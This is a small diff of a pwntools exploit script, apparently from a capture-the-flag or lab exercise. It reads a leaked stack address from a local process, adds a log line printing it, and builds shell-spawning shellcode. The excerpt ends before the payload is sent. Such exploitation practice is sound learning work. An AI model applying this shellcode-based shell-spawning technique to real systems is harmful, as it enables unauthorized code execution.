@@ -6,6 +6,7 @@ p = process(binary.path)
 p.recvuntil('\n')
 _ = p.recvline().strip()
 stack = int(_,16)
+log.info('stack: ' + hex(stack))
 
 shellcode = asm(shellcraft.sh())
 
